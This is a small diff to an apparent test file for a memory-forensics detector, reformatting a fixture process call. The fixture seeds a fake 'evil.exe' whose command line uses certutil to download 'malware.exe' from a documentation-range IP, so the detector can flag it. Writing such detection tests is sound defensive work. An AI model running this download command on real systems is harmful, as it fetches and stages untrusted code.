@@ -64,7 +64,14 @@ def test_attacker_text_is_quoted_not_judged() -> None:
         image={"kind": "image", "size_bytes": 1, "sha256": "0" * 64, "layer": "L", "arch": "x64"},
     )
     d.add_process(4, 0, "System", None, 0, cmdline="")
-    d.add_process(7000, 4, "evil.exe", WIN + "evil.exe", 1, cmdline="certutil -urlcache -f http://198.51.100.1/malware.exe m.exe")
+    d.add_process(
+        7000,
+        4,
+        "evil.exe",
+        WIN + "evil.exe",
+        1,
+        cmdline="certutil -urlcache -f http://198.51.100.1/malware.exe m.exe",
+    )
     out = detections.run(d.view(), LIMITS)
     finding = next(f for f in out.findings if f.type == "mem_suspicious_cmdline")
     template = TEMPLATES["mem_suspicious_cmdline"][2]
